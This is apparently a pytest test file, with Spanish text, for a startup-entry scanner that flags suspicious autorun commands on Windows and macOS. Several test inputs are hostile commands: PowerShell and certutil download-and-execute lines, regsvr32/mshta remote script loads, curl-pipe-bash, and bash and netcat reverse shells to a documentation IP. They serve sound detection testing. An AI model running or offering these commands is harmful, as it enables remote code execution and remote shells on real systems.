"""Noviembre de 2026: órdenes con trucos típicos del malware, RunOnceEx, Active Setup y
mejores tipos para lo que no está en la lista de conocidos."""

import pytest

from bootscout import judge
from bootscout import scan_windows as sw
from bootscout.entry import (
    CHECK,
    KIND_BROWSER,
    KIND_CHAT,
    KIND_CLOUD,
    KIND_GAMES,
    KIND_REMOTE,
    KIND_VPN,
    OPTIONAL,
    Entry,
)
from bootscout.winreg_source import RegKey, Source

ENV = {"APPDATA": r"C:\Users\Ana\AppData\Roaming", "SystemRoot": r"C:\Windows", "windir": r"C:\Windows"}


def e(**kw):
    kw.setdefault("when", "Al iniciar sesión")
    kw.setdefault("where", "Registro: Run")
    return Entry(id="x", name=kw.pop("name", "X"), **kw)


@pytest.mark.parametrize(
    ("command", "words"),
    [
        (r"powershell.exe -nop -w hidden -c iex(iwr http://198.51.100.7/a.ps1)", "descarga"),
        (r"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\x.ps1", "oculta"),
        (r"mshta.exe http://198.51.100.7/x.hta", "internet"),
        (r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)', "código"),
        (r"regsvr32 /s /n /u /i:http://198.51.100.7/x.sct scrobj.dll", "internet"),
        (r"certutil -urlcache -split -f http://198.51.100.7/x.exe C:\x.exe", "descarga"),
        (r"bitsadmin /transfer job http://198.51.100.7/x.exe C:\x.exe", "descarga"),
        ("/bin/bash -c 'curl -fsSL http://198.51.100.7/x.sh | bash'", "descarga"),
        ("/bin/sh -c 'echo ZWNobyBob2xh | base64 -d | sh'", "Base64"),
        ("bash -i >& /dev/tcp/198.51.100.7/4444 0>&1", "control"),
        ("nc -e /bin/sh 198.51.100.7 4444", "control"),
    ],
)
def test_malware_tricks_in_the_command_are_flagged(command, words):
    entry = judge.judge(e(command=command, path=r"C:\Windows\System32\cmd.exe", exists=True, signature="válida",
                          signer="Microsoft Windows"))  # fmt: skip
    assert entry.verdict == CHECK
    assert any(words.lower() in r.lower() for r in entry.reasons), entry.reasons


def test_encoded_powershell_is_flagged():
    entry = judge.judge(e(command="powershell -enc ZQBjAGgAbwA=", encoded=True, inline="echo"))
    assert entry.verdict == CHECK and any("Base64" in r for r in entry.reasons)


def test_scripts_in_appdata_are_flagged():
    entry = judge.judge(
        e(
            command=r"wscript.exe C:\Users\Ana\AppData\Roaming\upd.vbs",
            path=r"C:\Users\Ana\AppData\Roaming\upd.vbs",
            exists=True,
        )  # fmt: skip
    )
    assert entry.verdict == CHECK and any("AppData" in r for r in entry.reasons)


def test_files_in_folders_anyone_can_write_are_flagged():
    for path in (r"C:\Users\Public\svc.exe", r"C:\$Recycle.Bin\S-1-5-21\x.exe", r"C:\ProgramData\x.exe"):
        entry = judge.judge(e(command=path, path=path, exists=True, signature="sin firma"))
        assert entry.verdict == CHECK and any("cualquiera" in r for r in entry.reasons), path


def test_normal_commands_are_not_flagged():
    entry = judge.judge(e(name="Spotify", command=r'"C:\Users\Ana\AppData\Roaming\Spotify\Spotify.exe" /minimized',
                          path=r"C:\Users\Ana\AppData\Roaming\Spotify\Spotify.exe", exists=True))  # fmt: skip
    assert entry.verdict == OPTIONAL
    cosa = r"C:\Program Files\Cosa\cosa.exe"
    signed = judge.judge(
        e(name="Cosa", command=f"{cosa} --tray", path=cosa, exists=True, signature="válida", signer="Cosa SL")
    )
    assert signed.verdict == OPTIONAL


@pytest.mark.parametrize(
    ("name", "kind"),
    [
        ("Discord Canary", KIND_CHAT),
        ("WhatsApp Beta", KIND_CHAT),
        ("pCloud Drive", KIND_CLOUD),
        ("Nextcloud", KIND_CLOUD),
        ("Ubisoft Connect", KIND_GAMES),
        ("GOG Galaxy", KIND_GAMES),
        ("Brave Browser Update", None),  # «update» manda: es un actualizador
        ("Vivaldi", KIND_BROWSER),
        ("RustDesk", KIND_REMOTE),
        ("WireGuard Tunnel", KIND_VPN),
    ],
)
def test_kind_of_unknown_programs_by_name(name, kind):
    entry = judge.judge(e(name=name, command=r"C:\x\y.exe", path=r"C:\x\y.exe", exists=True, signature="válida",
                          signer="Alguien SL"))  # fmt: skip
    if kind:
        assert entry.kind == kind, entry.kind


def test_runonceex_is_scanned():
    key = r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx"
    reg = {
        key: RegKey(
            subkeys={
                "0001": RegKey(values={"": "Instalar", "Line1": r"C:\Temp\setup.exe /q"}),
                "Depend": RegKey(values={"1": r"C:\Users\Public\evil.dll"}),
            }
        )
    }
    files = {r"c:\temp\setup.exe": b"x", r"c:\users\public\evil.dll": b"x"}
    entries = sw.run_key_entries(Source(registry=reg, files=files, env=ENV))
    paths = {x.path.lower() for x in entries}
    assert r"c:\temp\setup.exe" in paths and r"c:\users\public\evil.dll" in paths
    assert all("RunOnceEx" in x.where for x in entries)
    dll = next(x for x in entries if x.path.lower().endswith("evil.dll"))
    assert "unusual" in dll.extra


def test_runonceex_dll_syntax():
    key = r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx"
    reg = {key: RegKey(subkeys={"0002": RegKey(values={"1": r"||C:\Program Files\X\x.dll|DllRegisterServer"})})}
    (entry,) = sw.run_key_entries(Source(registry=reg, files={r"c:\program files\x\x.dll": b"x"}, env=ENV))
    assert entry.path == r"C:\Program Files\X\x.dll"


def test_active_setup_is_scanned():
    key = r"HKLM\Software\Microsoft\Active Setup\Installed Components"
    reg = {
        key: RegKey(
            subkeys={
                "{89820200-ECBD-11cf-8B85-00AA005B4383}": RegKey(
                    values={"": "Internet Explorer", "StubPath": r"C:\Windows\System32\ie4uinit.exe -UserConfig"}
                ),
                "{AAAAAAAA-0000-0000-0000-000000000000}": RegKey(
                    values={"StubPath": r"C:\Users\Public\x.exe", "IsInstalled": 1}
                ),
                "{BBBBBBBB-0000-0000-0000-000000000000}": RegKey(
                    values={"StubPath": r"C:\apagado.exe", "IsInstalled": 0}
                ),
            }
        )
    }
    files = {r"c:\windows\system32\ie4uinit.exe": b"x", r"c:\users\public\x.exe": b"x", r"c:\apagado.exe": b"x"}
    entries = sw.special_entries(Source(registry=reg, files=files, env=ENV))
    names = {x.name for x in entries}
    assert "Internet Explorer" in names and len(entries) == 2  # el de IsInstalled=0 no cuenta
    assert all("Active Setup" in x.where and "primera vez" in x.trigger for x in entries)


def test_cloud_init_pipe_is_not_a_red_flag():
    # Los servicios de cloud-init de Ubuntu hacen esto, y son del sistema.
    command = 'sh -c echo "start" | nc -U /run/cloud-init/share/config.sock | sh'
    assert judge.red_flags(e(command=command, path="/usr/bin/sh")) == []


def test_a_startup_shortcut_disabled_by_boot_scout_can_be_turned_back_on():
    # Desactivar mueve el acceso directo a «Desactivados por boot-scout». Antes, en la
    # siguiente pasada ya no salía, y solo se podía volver a activar con «deshacer».
    from bootscout import lnk

    startup = r"C:\Users\Ana\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    files = {
        f"{startup}\\Desactivados por boot-scout\\Steam.lnk": lnk.build(r"C:\Steam\steam.exe", "-silent"),
        r"C:\Steam\steam.exe": b"x",
    }
    (entry,) = sw.startup_folder_entries(Source(files=files, env=ENV))
    assert entry.name == "Steam" and entry.enabled is False
    assert entry.id == "win:startup:usuario:Steam.lnk"
    assert entry.toggle == {"kind": "startup-file", "file": f"{startup}\\Steam.lnk"}


def test_missing_program_on_macos_is_broken(monkeypatch):
    import plistlib

    from bootscout import scan_macos as sm
    from bootscout.entry import BROKEN

    agent = {"Label": "com.old.helper", "Program": "/Applications/Old.app/Contents/helper", "RunAtLoad": True}
    files = {"/Library/LaunchAgents/com.old.helper.plist": plistlib.dumps(agent)}
    monkeypatch.setattr(sm, "_exists", lambda path: False)
    (entry,) = sm.launchd_entries(files, "Al iniciar sesión", "x", "sistema", None)
    assert entry.exists is False and judge.judge(entry).verdict == BROKEN
    monkeypatch.setattr(sm, "_exists", lambda path: True)
    (entry,) = sm.launchd_entries(files, "Al iniciar sesión", "x", "sistema", None)
    assert entry.exists is True and judge.judge(entry).verdict != BROKEN


def test_the_red_flag_is_the_first_reason():
    entry = judge.judge(e(command="powershell -w hidden -c iex(iwr http://198.51.100.7/a)", exists=True,
                          path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                          signature="válida", signer="Microsoft Windows"))  # fmt: skip
    assert "internet" in entry.reasons[0]
